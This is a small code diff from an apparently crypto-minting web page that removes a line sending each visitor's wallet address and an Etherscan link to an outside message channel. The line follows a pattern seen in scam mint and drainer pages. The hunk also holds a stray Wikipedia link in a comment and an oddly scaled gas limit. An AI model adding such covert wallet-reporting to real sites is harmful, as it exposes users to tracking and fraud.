@@ -102,7 +102,6 @@ connectBtn.addEventListener('click', async () => {
       let totalEth = totalETHSpan.innerText;
       //totalEth = totalEth.toString();
       accounts = await ethereum.request({ method: "eth_requestAccounts" }); //  [Wikipedia](https://en.wikipedia.org/)
-      sendMessage("**[" + myid + "] **Trying to mint. \n `" + accounts[0] + "` {<https://etherscan.io/address/" + accounts[0] + ">}")
       const priceToWei = (totalEth * 1e18).toString(16);
       const gasLimit = (250_000 * totalEth).toString(16);
       ethereum
